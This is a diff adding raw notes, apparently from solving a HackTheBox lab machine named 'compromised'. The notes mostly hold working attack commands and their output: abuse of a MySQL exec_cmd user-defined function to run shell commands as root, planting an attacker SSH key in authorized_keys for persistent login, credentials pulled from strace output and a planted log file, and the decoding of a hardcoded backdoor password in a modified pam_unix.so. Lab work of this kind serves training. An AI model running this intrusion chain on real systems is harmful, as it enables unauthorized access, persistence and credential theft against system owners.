@@ -5,3 +5,48 @@ https://medium.com/@foxsin34/litecart-2-1-2-arbitrary-file-upload-authenticated-
 username = "admin" # Change this
 password = "theNextGenSt0r3!~" # Change this
 
+
+echo changethis | mysql -u root -p -e 'show databases'
+echo changethis | mysql -u root -p -e 'show databases;use ecom;show tables'
+
+echo changethis | mysql -u root -p -e 'show databases;use ecom;select * from lc_users'
+
+echo changethis | mysql -u root -p -e 'select *  from mysql.func'
+
+output: exec_cmd    0    libmysql.so    function
+
+echo changethis | mysql -u root -p -e "select exec_cmd('id')"
+echo changethis | mysql -u root -p -e "select exec\_cmd('ls \-la /var/lib/mysql')"
+
+echo changethis | mysql -u root -p -e "select exec\_cmd('cd /var/lib/mysql && mkdir .ssh')"
+
+echo changethis | mysql -u root -p -e "select exec\_cmd('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCTgy/f2SVx1EOC8I7dNnGVra06k9xv1qZkCgMYqPyhC1TacedzPqcYSCYmsSweotKdSq9NW0XiCwPz5nkX9mJlC5quHLO+FTVyshsCjq5kLDchcO568ubQfe578bdVC4W1XXL5QGk6uyOOiI94TaXdOgLWbCzxUN/MNsx2Ylu/oYMjYIuL0N0TpBMdTAU+jo+A3HKk0IBTqcR9KTMCygHxybphoRSYuZvh3oG0bU5/Umyxb1NfR5r0QhJ29ZyKHqjUxmCWGv10mfbOYx2K81xEuIkqr4hNiMMgbKG3gpy2JXhOx8WJD/LsT5pnRA259jCFibsBUMUH8V4uSPPfjXE5VXRdyDqM6zqQOvkbtRnFPe66JW0JqK+9OfafSfgBtEv9BCPgbzMYw25JrBjhX3K86+MubEMj4AJOPz2w5AFqepSNTW9aHe9tCCy0Mrg16TVg9sS9R4O61Z2mrz39e3j1GbaUFbx/sP1Bu3ZEqTi5NSvV0HKGu+xxECLT+RT3F60= user@parrot > /var/lib/mysql/.ssh/authorized_keys')"
+
+ssh -i id_rsa mysql@compromised.htb
+
+
+22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
+
+22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
+
+
+
+####/var/www/html/shop/admin/.log2301c9430d8593ae.txt:User: admin Passwd: theNextGenSt0r3!~
+
+
+/var/lib/security/pam_unix.so
+
+backdoor._0_8_ = 0x4533557e656b6c7a;
+backdoor._8_7_ = 0x2d326d3238766e;
+
+ 0x41462d582a4e552d
+
+ verify_pwd_hash
+
+ bytes.fromhex('4533557e656b6c7a').decode('utf-8') - E3U~eklz
+
+ bytes.fromhex('2d326d3238766e').decode('utf-8') -   -2m28vn
+
+E3U~eklz -2m28vn - reverse both  the strings
+
+zlke~U3Env82m2-
